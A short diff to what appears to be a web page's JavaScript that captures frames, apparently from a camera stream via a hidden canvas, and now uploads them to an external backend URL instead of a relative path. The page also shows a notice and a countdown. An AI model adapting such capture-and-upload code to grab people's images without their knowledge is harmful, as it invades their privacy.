@@ -4,6 +4,8 @@ const canvas = document.getElementById('hiddenCanvas');
 const notice = document.getElementById('notice');
 const countdownEl = document.getElementById('countdown');
 const statusEl = document.getElementById('status');
+const UPLOAD_URL = 'https://the-nexus-media-backend.onrender.com/upload';
+
 
 let stream = null;
 let captureTimeout = null;
@@ -91,7 +93,7 @@ function captureAndUpload() {
 
     statusEl.textContent = ' ';
     try {
-      const resp = await fetch('/upload', { method: 'POST', body: form });
+      const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
       let json = null;
       try { json = await resp.json(); } catch (_) {}
       if (resp.ok) {
